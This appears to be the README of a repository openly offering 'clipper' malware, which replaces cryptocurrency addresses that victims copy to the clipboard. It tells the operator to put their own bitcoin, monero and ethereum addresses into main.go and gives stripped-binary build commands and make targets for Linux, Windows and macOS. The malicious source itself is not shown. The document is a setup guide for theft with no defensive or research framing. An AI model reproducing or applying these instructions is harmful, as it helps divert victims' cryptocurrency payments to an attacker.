## Simple cross platform clipper malware

### Build

First edit `main.go` and add your crypto wallet addresses here:

```golang
var btc_add = "" // bitcoin
var xmr_add = "" // monero
var eth_add = "" // etherum
```

Then:

```bash
# linux 
GOOS=linux go build -ldflags="-w -s" 
# windows
GOOS=windows go build -ldflags="-w -s"
# mac
GOOS=darwin go build -ldflags="-w -s"
```

or

```
# build for linux windows mac
make
 
# build for linux
make linux

# build for macos
make mac

# build for windows
make windows

# delete binaries
make clean
```
